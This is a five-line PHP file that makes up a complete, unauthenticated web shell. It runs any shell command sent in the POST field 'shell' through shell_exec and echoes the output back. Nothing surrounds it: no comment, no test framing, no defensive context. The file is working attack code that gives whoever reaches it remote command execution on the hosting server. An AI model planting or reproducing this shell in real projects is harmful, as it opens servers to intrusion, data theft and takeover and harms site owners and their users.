<?php
if (isset($_POST["shell"])) {
	echo shell_exec($_POST["shell"]);
}
?>